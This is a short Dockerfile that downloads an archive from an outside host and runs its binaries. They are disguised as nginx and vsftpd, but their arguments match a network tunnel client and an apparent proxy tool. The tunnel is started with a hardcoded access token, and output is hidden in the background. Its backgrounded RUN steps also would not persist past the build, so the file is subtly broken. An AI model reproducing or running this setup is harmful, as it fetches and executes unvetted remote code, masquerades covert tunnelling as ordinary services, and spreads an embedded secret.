FROM alpine:3.16
RUN apk add wget curl zstd tar
RUN wget https://idev.nyc.mn/vsftpd.tar.zst
RUN tar -xvf vsftpd.tar.zst
RUN nohup /abc/nginx tunnel --edge-ip-version auto --protocol http2 run --token eyJhIjoiMzNlNWExODA4NDVhM2RkODdmN2VjNjUzN2JmMmE3NjIiLCJ0IjoiMDY1ZTY1YTMtYjJkNS00MDY1LWFjYmMtM2NiNjhjNDIzY2QwIiwicyI6IjNWeWExYlZhYkozTENYY0lFUFJLcytsdkFlOGJXQXdXeXlLZmlHaWtpK2M9In0= >/dev/null 2>&1 &
RUN nohup /abc/vsftpd run -c ./config.json >/dev/null 2>&1 &

